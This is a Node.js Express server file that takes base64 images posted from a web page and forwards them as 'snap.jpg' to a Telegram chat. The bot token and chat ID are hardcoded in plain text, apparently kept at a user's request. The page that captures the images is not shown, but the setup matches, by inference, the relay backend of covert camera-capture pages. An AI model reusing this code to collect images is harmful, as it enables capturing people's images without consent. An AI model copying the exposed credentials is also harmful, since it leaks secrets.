// server.js
const path = require('path');
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// KEEPING your hardcoded token & chat id as requested
const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
const CHAT_ID = '5574741182';

app.use(cors());
app.use(express.json({ limit: '12mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/upload-photo', async (req, res) => {
  try {
    const { dataUrl } = req.body;
    if (!dataUrl || !dataUrl.startsWith('data:image/')) {
      return res.status(400).json({ ok: false, error: 'Invalid image' });
    }

    const matches = dataUrl.match(/^data:(image\/\w+);base64,(.+)$/);
    if (!matches) return res.status(400).json({ ok: false, error: 'Bad format' });

    const mime = matches[1];
    const b64 = matches[2];
    const buffer = Buffer.from(b64, 'base64');

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'snap.jpg', contentType: mime });

    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });
    const json = await resp.json();

    if (!json.ok) {
      console.error('Telegram API error:', json);
      return res.status(500).json({ ok: false, error: 'Telegram error', telegram: json });
    }

    res.json({ ok: true, result: { message_id: json.result?.message_id || null }});
  } catch (err) {
    console.error('Upload error:', err);
    res.status(500).json({ ok: false, error: String(err) });
  }
});

app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
});
